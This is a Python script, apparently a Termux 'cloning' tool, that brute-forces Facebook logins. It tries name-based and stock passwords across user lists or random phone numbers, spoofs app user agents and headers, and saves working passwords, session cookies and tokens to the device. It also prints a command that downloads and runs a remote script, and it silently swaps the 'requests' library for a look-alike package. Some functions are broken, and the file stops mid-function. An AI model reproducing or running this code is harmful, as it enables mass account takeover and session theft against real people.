
import os,sys,tempfile,string,random,subprocess,platform,uuid,os,shutil,zlib,smtplib,base64,uuid,time,json,re
from uuid import uuid4
from time import sleep as sp


try:
	import requests
except ModuleNotFoundError:
	os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requestsv')
	#os.system("python dilute")

try:
	import bs4
	from bs4 import BeautifulSoup as pars
except ModuleNotFoundError:
	os.system('pip install bs4')
except Exception as e:
	print(e)

from concurrent.futures import ThreadPoolExecutor as tpe
import requests
from requests.exceptions import ConnectionError as CE


try:
	key = open(".key.txt","r").read()
except FileNotFoundError:
	key = 'none'

def line():
	print(51*'-')

def p(x):
	print(x)

#___________ [ Lists Used in Script]________

id = []
ok = []
cp = []
loop = 0
method=[]
#SEX= f"{random.choice(['Liger','METERED','MOBILE.EDGE' ,'MOBILE.HSPA','MOBILE.LTE','MODERATE'])}"
SEX = f"{random.choice(['Liger', 'METERED', 'MOBILE.EDGE', 'MOBILE.HSPA', 'MOBILE.LTE', 'MODERATE', 'Fiber', 'DSL', 'Satellite', 'Dial-up', 'Fixed Wireless', 'Cable', 'WiMAX'])}"
ses = requests.Session()
def logo():
	os.system('clear')
	logo = (f'''\33[1;99m
 \33[1;91m

                                      
        **             ***** *               
     *****          ******  *          *     
    *  ***         **   *  *          ***    
       ***        *    *  *            *     
      *  **           *  *                   
      *  **          ** **           ***     
     *    **         ** **            ***    
     *    **         ** **             **    
    *      **        ** **             **    
    *********        ** **             **    
   *        **       *  **             **    
   *        **          *              **    
  *****      **     ****           *   **    
 *   ****    ** *  *  *************    *** * 
*     **      **  *     *********       ***  
*                 *                          
             
 \33[1;96m--------------------------------------------------''')                                                                                                                                            
	p(logo)
def clear():
	os.system("clear")


uuidd = str(os.geteuid()) + str(os.getlogin()) + str(os.getuid())
id = "".join(uuidd).replace("_","").replace("360","AHS").replace("u","9").replace("a","A")
plat = platform.version()[14:][:21][::-1].upper()+platform.release()[5:][::-1].upper()+platform.version()[:8]
xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
bxd = ""

bumper = f'{id}{xp}'

def connection_token():
	 digits_count = 16
	 letters_count = 16
	 letters = ''.join((random.choice(string.ascii_letters) for i in range(letters_count)))
	 digits = ''.join((random.choice(string.digits) for i in range(digits_count)))

	 # Convert resultant string to list and shuffle it to mix letters and digits
	 sample_list = list(letters + digits)
	 random.shuffle(sample_list)
	 # convert list to string
	 final_string = ''.join(sample_list)
	 return final_string

#method 1
useragents = "Dalvik/2.1.0 (Linux; U;Android 13; SM-A235F Build/TP1A.220624.014) [FBAN/FB4A;FBAV/475.0.0.3.109;FBBV/324809662;FBDM/{density=3.0,width=1080,height=1920};FBLC/fr_FR;FBCR/AT&T;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/Samsung A235F;FBSV/9.0;nullFBCA/armeabi-v7a:armeabi;]"



userageent = "Dalvik/2.1.0 (Linux; U;Android 13; V2132 Build/TP1A.220624.014) [FBAN/FB4A;FBAV/439.0.0.29.119;FBBV/317807897;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/null;FBMF/vivo;FBBD/vivo;FBPN/com.instagram.android;FBDV/vivo V2132;FBSV/7.0;nullFBCA/armeabi-v7a:armeabi;"

uk3 = "Dalvik/2.1.0 (Linux; U; Android 5.1; Fire2 LTE Build/LMY47D) [FBAN/Orca-Android;FBAV/427.0.0.0.4;FBPN/com.facebook.orca;FBLC/en_US;FBBV/314805577;FBCR/null;FBMF/InnJoo;FBBD/InnJoo;FBDV/LMY47D;FBSV/5.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=1424,height=720};FB_FW/1;] FBBK/1"



def ua1():
    import random
    FBLC = random.choice(['bn _BD', 'bn _BD'])
    FBAN = random.choice(['FB4A', 'Orca-Android'])
    FBCR = random.choice(['Null', 'null','Grameenphone', 'Robi', 'Banglalink', 'Teletalk', 'Airtel'])
    FBSV = random.choice(['6', '7', '8', '9', '10', '11', '12'])
    model = random.choice(['CPH1861', 'RMX3630', 'RMX3663', 'RMX3660', 'RMX3686', 'RMX3617', 'RMX3771', 'RMX3741', 'RMX1805', 'RMX1801', 'RMX1821', 'RMX1851', 'RMX1827', 'RMX1911', 'RMX1919', 'RMX1927', 'RMX1971', 'RMX2030', 'RMX2032', 'RMX1925', 'RMX2001', 'RMX2061', 'RMX2063', 'RMX2040', 'RMX2002', 'RMX2151', 'RMX2163', 'RMX2170', 'RMX2103', 'RMX3085', 'RMX3151', 'RMX3381', 'RMX3521', 'RMX3471', 'RMX3472', 'RMX3392', 'RMX3491', 'RMX3612', 'A1603', 'RMX2185', 'RMX3231', 'RMX2189', 'RMX2180', 'RMX2195', 'RMX2101', 'RMX1945', 'RMX1941', 'RMX3063', 'RMX3061', 'RMX3201', 'RMX3261', 'RMX3263', 'RMX3193', 'RMX3191', 'RMX3195', 'RMX3197', 'RMX3265', 'RMX3268', 'RMX3269', 'RMX2027', 'RMX2020', 'RMX3581', 'RMX3690', 'RMX3501', 'RMX3624', 'RMX3511', 'RMX3760', 'RMX3710', 'RMX3310', 'RMX3311', 'RMX3312', 'RMX3551', 'RMX3301', 'RMX3300', 'RMX3709', 'RMX2202','RMX3360', 'RMX3360', 'RMX3031', 'RMX3370', 'RMX3357', 'RMX3560', 'RMX3561', 'RMX3563', 'RMX3563', 'RMX3371', 'RMX3372', 'RMX3706', 'RMX3700', 'RMX3350', 'RMX2193', 'RMX2161','RMX2050', 'RMX2156', 'RMX3242', 'RMX3171', 'RMX3286', 'RMX3572', 'RMX3395', 'RMX3430', 'RMX3516', 'RMX3235', 'RMX3506', 'RMP2102', 'RMP2106', 'RMP2107', 'RMP2108', 'RMX2117', 'RMX2173', 'RMX3161', 'RMX2205', 'RMX3142', 'RMX3461', 'RMX3462', 'RMX3478', 'RMX3372', 'RMX3574', 'RMX1831', 'RMX1833', 'RMX3121', 'RMX3125', 'RMX3041', 'RMX3092', 'RMX3611', 'RMX3571', 'RMX3475', 'RMX2200', 'RMX2111', 'RMX1901', 'RMX1903', 'RMX1991', 'RMX1992', 'RMX1993', 'RMX1931', 'RMX2083', 'RMX2085', 'RMX2081', 'RMX2142', 'RMX2086', 'RMX2144', 'RMX2076', 'RMX2075', 'RMX2071', 'RMX2072', 'RMX2052', 'RMX2176', 'RMX3115', 'RMX1921', 'RMX3115'])
    
    ua = f"[FBAN/{FBAN};FBAV/{random.randint(101, 393)}.0.0.8.{random.randint(50, 120)};FBBV/37166{random.randint(111, 999)};FBDM/" + \
         "{density=1.5,width=720,height=" + f"{random.randint(100, 1200)}" + "}" + \
         f";FBLC/{FBLC};FBCR/{FBCR};FBMF/Realme;FBBD/Realme;FBDV/{model};FBSV/{FBSV};FBCA/armeabi-v7a:armeabi;]"
    
    return ua






def uav():
    fban = random.choice(["FB4A", "FB5A", "FB6A"])
    fbav = random.randint(200, 440)
    fbpn = random.choice(["com.facebook.katana", "com.facebook.orca"])
    network_carriers = ["Zong", "Jazz", "Ufone", "Telenor", "Verizon", "AT&T", "T-Mobile", "Sprint"]
    fbbv = str(random.randint(10000000, 99999999))
    fbrv = str(random.randint(10000000, 99999999))
    uaa1 = "Davik/2.1.0 (Linux; U; Android 13; V2132 Build/TP1A.220624.014) [FBAN/FB4A;FBAV/439.0.0.29.119;FBBV/317807897;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/null;FBMF/vivo;FBBD/vivo;FBPN/com.instagram.android;FBDV/vivo V2132;FBSV/7.0;nullFBCA/armeabi-v7a:armeabi;]"
    
    fban2 = random.choice(["FB4A", "FB5A", "FB6A", "Orca-Android"])
    fbav2 = random.randint(200, 440)
    fbpn2 = random.choice(["com.facebook.katana", "com.facebook.orca"])
    fblc2 = random.choice(["en_US", "pl_PL", "en_GB"])
    fbbv2 = str(random.randint(10000000, 99999999))
    fbrv2 = str(random.randint(10000000, 99999999))
    network_carriers2 = ["Zong", "Jazz", "Ufone", "Telenor", "Verizon", "AT&T", "T-Mobile", "Sprint"]
    fbsv2 = random.randint(6, 12)
    uaa2 = "Dalvik/2.1.0 (Linux; U; Android 13; V2132 Build/TP1A.220624.014) [FBAN/FB4A;FBAV/439.0.0.29.119;FBBV/317807897;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/null;FBMF/vivo;FBBD/vivo;FBPN/com.instagram.android;FBDV/vivo V2132;FBSV/7.0;nullFBCA/armeabi-v7a:armeabi;]"
    
    fban3 = random.choice(["FB4A", "FB5A", "FB6A", "Orca-Android"])
    fbav3 = random.randint(200, 440)
    fbpn3 = random.choice(["com.facebook.katana", "com.facebook.orca"])
    fblc3 = random.choice(["en_US", "pl_PL", "en_GB"])
    fbbv3 = str(random.randint(10000000, 99999999))
    fbrv3 = str(random.randint(10000000, 99999999))
    network_carriers3 = ["Zong", "Jazz", "Ufone", "Telenor", "Verizon", "AT&T", "T-Mobile", "Sprint"]
    fbsv3 = random.randint(6, 12)
    uaa3 = "Davik/2.1.0 (Linux; U; Android 10; SHG01 Build/S1180) [FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20106269;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/AT&T;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/Pixel 3;FBSV/9.0;nullFBCA/armeabi-v7a:armeabi;]"
    
    ua = random.choice([uaa1, uaa2, uaa3])
    return ua

def iAmMethod1Ua():
	
	ios_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
	END = "[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20106269;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/AT&T;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/Pixel 3;FBSV/9.0;nullFBCA/armeabi-v7a:armeabi;] FBBK/1"
	ua = random.choice("Dalvik/2.1.0 (Linux; U; Android '+fbsv+'.0.1; '+model+' Build/'+build+') [FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20106269;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/AT&T;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/Pixel 3;FBSV/9.0;nullFBCA/armeabi-v7a:armeabi;],")
	return ua
def generate_user_agent():
    android_version = random.choice(["9", "10", "11"])
    device_name = random.choice(["Redmi Note 8T", "Redmi 9T", "Redmi Note 10 Pro", "Redmi Note 9", "Redmi 10", "Redmi Note 11", "Redmi 11T", "Redmi 9A", "Redmi Note 8 Pro", "Redmi 9 Power"])
    miui_version = "V" + '.'.join(map(str, random.choices(range(10), k=3)))
    fban = "Orca-Android"
    fbbv = '.'.join(map(str, random.choices(range(10), k=5)))
    fbav = '.'.join(map(str, random.choices(range(10), k=5)))
    fbpn = "com.facebook.orca"
    fblc = random.choice(["pl_PL", "en_US", "fr_FR", "de_DE", "es_ES"])
    fbcr = random.choice(["PLAY (T-Mobile)", "Verizon", "Vodafone", "AT&T"])
    fbmf = "Xiaomi"
    fbbd = "Redmi"
    fbdv = device_name
    fbsv = android_version
    fbca = random.choice(["arm64-v8a", "armeabi-v7a"])
    density = str(random.uniform(1, 3))[:4]
    width = random.randint(500, 1999)
    height = random.randint(999, 2999)
    fb_dm = "{density=" + density + ",width=" + str(width) + ",height=" + str(height) + "}"
    fb_fw = "FB_FW/1"
    user_agent = "Dalvik/2.1.0 (Linux; U; Android " + android_version + "; " + device_name + " MIUI/" + miui_version + ") "
    user_agent += "[FBAN/" + fban + ";FBAV/" + fbav + ";FBPN/" + fbpn + ";FBLC/" + fblc + ";FBBV/" + fbbv + ";FBCR/" + fbcr + ";"
    user_agent += "FBMF/" + fbmf + ";FBBD/" + fbbd + ";FBDV/" + fbdv + ";FBSV/" + fbsv + ";FBCA/" + fbca + ":null;"
    user_agent += "FBDM/" + fb_dm + ";" + fb_fw + "] FBBK/1"
    return user_agent
#method 2
def iAmMethod4Ua():
	ios_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
	END = "[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20106269;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/AT&T;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/Pixel 3;FBSV/9.0;nullFBCA/armeabi-v7a:armeabi;]"
	ua = random.choice("Dalvik/2.1.0 (Linux; U; Android '+fbsv+'.0.1; '+model+' Build/'+build+') [FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20106269;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/AT&T;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/Pixel 3;FBSV/9.0;nullFBCA/armeabi-v7a:armeabi;]")
	return ua

nid = ''.join((random.choice(['A','a','B','b','c','C','d','D','e','E','F','f','G','g','h','H','i','I','j','J','k','K','l','L','m','M','N','n','o','O','p','P','q','Q','r','R','s','S','t','T','u','U','v','V','w','W','x','X','y','Y','z','Z']) for i in range(12)))
tid = str(random.randint(111,999))
class iAmMain:
	
	def __init__(self):

		self.gp = "https://b-graph.facebook.com/auth/login"
		self.ap = "https://b-api.facebook.com/auth/login"
	def iAmMenu(self):
		logo()
		
		
		p(" [1] File Cloning ")
		p(" [2] Random Clone")
		p(" [3] Dump Tool")
		p(" [4] Pass changer ")
		p(" [5] Join Whatsapp Group ")
		p(" [E] Exit Tool ")
		line()
		opt1 = input(" {√} Select An Option : ")
		if opt1 == "1":self.file_menu()
		
		elif opt1 == "2":self.num_menu()
		elif opt1 == "4":automation().menu()
		elif opt1 == "3":Grep().links_only()
		elif opt1 == "5":os.system('xdg-open https://chat.whatsapp.com/BwR3pg3UYAsI03wWyal7BM')
		elif opt1 == "E":exit(" [•] KATM.TATA BY BY")
		else:p(" [•] Wrong Select ");sp(2);self.iAmMenu()
	
	def dump_menu(self):
		 print("rm -rf dump && mkdir dump && cd dump && curl -L https://raw.githubusercontent.com/dcofficial/dump/main/dump > dump && python dump")
		
	def file_menu(self):
		logo()
		p(" [•] Example /sdcard/filename.txt")
		file = input(" [•] Put File Path : ")
		try:
			id = open(file,"r").read().splitlines()
			self.method_select(id)
		except FileNotFoundError:
			p(" [•] File Path Incorrect ")
			sp(2);self.file_menu()
		
	def method_select(self,id):
		logo()
		p(" [1] Method 1 [BEST] ")
		p(" [2] Method 2 [BEST] ")
		#p(" [3] Method 3 [BEST] ")
		#p(" [4] Method 4 [BEST] ")
		line()
		m_opt = input(" [•] Choose : ")
		if m_opt =='1':
			method.append("i")
			self.password_menu(id)
		elif m_opt =="2":
			method.append('ii')
			self.password_menu(id)
		elif m_opt =="3":
			method.append('iii')
			self.password_menu(id)
		elif m_opt =="4":
			 method.append('iiii')
			 self.password_menu(id)
		else:p(" [•] Wrong Select ! ");sp(2);self.method_select(id)

	def password_menu(self,id):
		pwx=[]
		logo()
		max = 20
		p(" [•] Example 1 , 2 , 3  to 20 Max ")
		try:
			plimit = int(input(" [•] Put limit : "))
			if plimit =="":
				plimit = 4
			elif plimit > max:
				p(" [•] Password Limit Should undet 20 ");sp(2);self.password_menu()
		except:
			plimit = 4
		logo()
		p(" [•] Enter Your Passwords like : first last First Last etc ")
		line()
		for n in range(plimit):
			pwx.append(input(" [•] Put Password %s : "%(n+1)))
		logo()
		p("  Total File Accounts : %s "%(str(len(id))))
		p(" Proces has been started ")
		line()
		with tpe(max_workers=30) as saqi:
			for user in id:
				uid = user.split("|")[0]
				nm = user.split("|")[1]
				if "i" in method:
					saqi.submit(self.method1,uid,nm,pwx)
				elif "ii" in method:
					saqi.submit(self.method2,uid,nm,pwx)
				elif "iii" in method:
					saqi.submit(self.method3,uid,nm,pwx)
				elif "iiii" in method:
					 saqi.submit(self.method4,uid,nm,pwx)
		self.saved_results(ok,cp)
	def saved_results(self,ok,cp):
		line()
		p(" [•] Cloning Hasbeen Completed ")
		p(" [•] Cloning Accounts Saved in /sdcard")
		p(" [•] Total Ok Accounts : %s "%(len(ok)))
		p(" [•] Total Cp Accounts : %s "%(len(cp)))
		line()
		input(" [•] Press Enter To Go Back ")
		self.iAmMenu()

	def num_menu(self):
		logo()
		pwx=[]
		p(" [•] Advanced Random Cloning Tool ")
		line()
		p(" [•] Example : 0300 , 0313 , 0324 , 0342 ")
		line()
		code = input(" [•] Put Sim Code : ")
		logo()
		p(" [•] Example : 1000, 2000 , 5000 Max ")
		max = 5000
		try:
			clone_limit = int(input(" [•] Put Clone Limit : "))
			if clone_limit =="":
				clone_limit = 1000
			elif clone_limit > max:
				p(" [•] Limit Should be Under 5000 ");sp(2);self.num_menu()
		except:
			clone_limit = 1000
		for n in range(clone_limit):
			_ = random.randint(1111111,9999999)
			id.append(str(_))
		logo()
		p(" [1] Auto Password \n [2] Choice Password ")
		line()
		pwx_=[]
		pw_select = input(" [•] Choose : ")
		if pw_select == "1":
			pwx_.append("i")
		elif pw_select == "2":
			pwx_.append('ii')
			max = 10
			try:
				p_limit = int(input(" [•] Put Password Limit : "))
				if p_limit =="":
					p_limit = 5
				elif p_limit > max:
					p(" [•] Limit Should be Under 1 - 10 ");sp(2);num_menu()
			except:
				p_limit = 5
			for n in range(p_limit):
				pwx.append(input(" [•] Put Password %s : "%(n+1)))
		else:
			pwx_.append("i")
		logo()
		
		p(" [•] Total Random Accounts : %s "%(str(len(id))))
		p(" [•] Dilute Brute Has Been Started ")
		line()
		with tpe(max_workers=30) as saqi:
			for user in id:
				uid = code+user
				if "i" in pwx_:
					pwx = [user,uid,"khan1122","khankhan","khan123","baloch","i love you","khan1234","khan12345"]
					saqi.submit(self.r_crack,uid,pwx)
				elif "ii" in pwx_:
					saqi.submit(self.r_crack,uid,pwx)
				else:
					saqi.submit(self.r_crack,uid,pwx)
		self.saved_results(ok,cp)
	def method1(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [King] %s | M1 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
				ln = fn
			for ps in pwx:
				pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
				data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "register_api",
"email": uid,
"password": pw,
"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "NO_FILE",
"etag":  random.choice(["fcc627766b9d33fa48c7e547d58e96e803c0f5c9", "28cce2d103004681314834a51898159392bd689c","682f553f4392d534c8bd9b9560e891fd6ae7c7e0", "01e11e2774574e9947c56db4ccd2c20c7c7aad08", "cbb9d287bcb664913899541d5fd35b0582c33964"]),
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "bn_BD",
"client_country_code": "BD",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
				headers = {'User-Agent': useragents,
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': f'{SEX}',
'Authorization':'OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895',
'X-FB-Connection-Quality':f'{SEX}',
"X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
				#a = headers
				#print(a)

				if "session_key" in q:
					token = q["access_token"]
					cok = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
					p('\r\033[1;92m[OK] %s | %s \033[1;97m '%(uid,pw))
					open('/sdcard/COOKIE_TOKEN.txt','a').write(cok+'|'+token+'\n')
					ok.append(uid)
					open('/sdcard/M1_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/M1_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/M1_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
			self.method1(uid,nm,pwx)
		except Exception as e:
			self.method1(uid,nm,pwx)
	def method2(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r King %s | M2 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
				ln = fn
			for ps in pwx:
				pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
				data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "register_api",
"email": uid,
"password": pw,
"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "NO_FILE",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_PK",
"client_country_code": "PK",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
				headers = {'User-Agent': userageent,
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(30000, 40000)),
'X-FB-SIM-HNI': str(random.randint(30000, 40000)),
'X-FB-Connection-Type': f'{SEX}',
'Authorization':'OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895',
'X-FB-Connection-Quality':f'{SEX}',
"X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': f'nid={nid};pid=Main;tid={tid};nc=1;fc=0;bc=0;cid={connection_token()}',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': connection_token()}
				q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()

				if "session_key" in q:
					cok = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
					token = q["access_token"]
					open('/sdcard/COOKIE_TOKEN.txt','a').write(cok+'|'+token+'\n')
					p('\r\033[1;92m[SHAKEEL-OK] %s | %s \033[1;97m '%(uid,pw))
					p(f" [•]\033[1;96m Cookie : {cok}\033[1;97m")
					ok.append(uid)
					open('/sdcard/SHAKEEL_M2_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/SHAKEEL_M2_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[SHAKEEL-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/SHAKEEL_M2_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
			self.method2(uid,nm,pwx)
		except Exception as e:
			self.method2(uid,nm,pwx)
	def method3(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [SHAKEEL %s |  OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
				ln = fn
			for ps in pwx:
				pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
				data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "register_api",
"email": uid,
"password": pw,
"access_token": "256002347743983|374e60f8b9bb6b8cbb30f78030438895",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "NO_FILE",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_PK",
"client_country_code": "PK",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
				headers = {'User-Agent': iAmMethod3Ua(),
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': f'{SEX}',
'Authorization':'OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895',
'X-FB-Connection-Quality':f'{SEX}',
"X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()

				if "session_key" in q:
					token = q["access_token"]
					cok = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
					open('/sdcard/COOKIES_TOKEN.txt','a').write(cok+'|'+token+'\n')
					p('\r\033[1;92m[SHAKEEL-OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/SHAKEEL_M3_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/SHAKEEL_M3_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[SHAKEEL-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/SHAKEEL_M3_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
			self.method3(uid,nm,pwx)
		except Exception as e:
			self.method3(uid,nm,pwx)
	def method4(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [SHAKEEL] %s | M4 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
				ln = fn
			for ps in pwx:
				pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
				params = {
					"access_token": "256002347743983|374e60f8b9bb6b8cbb30f78030438895",
					"sdk_version": f"{str(random.randint(1,26))}", 
					"email": uid,
					"locale": "en_PK",
					"password": pw,
					"sdk": "Android",
					"generate_session_cookies": "1",
					"sig": "374e60f8b9bb6b8cbb30f78030438895"
				}
				headers = {

					"Host": "graph.facebook.com",
					"x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)),
					"x-fb-sim-hni": str(random.randint(20000, 40000)),
					"x-fb-net-hni": str(random.randint(20000, 40000)),
					"x-fb-connection-quality": "EXCELLENT",
					"user-agent": iAmMethod4Ua(),
					"content-type": "application/x-www-form-urlencoded",
					"x-fb-http-engine": "Liger",
					"Authorization":"Auth2 256002347743983|374e60f8b9bb6b8cbb30f78030438895",
				}
				q = ses.post("https://b-graph.facebook.com/auth/login",params=params, headers=headers, allow_redirects=False).json()

				if "session_key" in q:
					#print(q)
					token = q["access_token"]
					cok = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
					open('/sdcard/COOKIES_TOKEN.txt','a').write(cok+'|'+token+'\n')
					p('\r\033[1;92m[SHAKEEL-OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/SHAKEEL_M4_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/SHAKEEL_M4_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[SHAKEEL-CP] %s | %s \033[1;97m '%(uid,pw))
